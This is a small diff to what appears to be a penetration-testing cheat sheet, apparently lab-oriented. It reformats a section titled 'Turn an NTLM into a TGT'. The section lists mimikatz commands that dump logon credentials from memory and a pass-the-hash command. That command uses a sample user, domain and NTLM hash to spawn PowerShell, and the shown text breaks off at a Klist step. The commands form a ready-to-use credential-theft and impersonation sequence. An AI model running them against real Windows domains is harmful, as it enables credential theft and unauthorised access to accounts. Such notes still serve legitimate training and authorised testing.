@@ -35,12 +35,14 @@
 https://adsecurity.org/?page_id=1821
 
 #### Turn an NTLM into a TGT:
+
 ```
 mimikatz#> 
 privilege::debug
 sekurlsa::logonpasswords
-sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
 ```
+
+```sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe```
 
 ```
 Klist
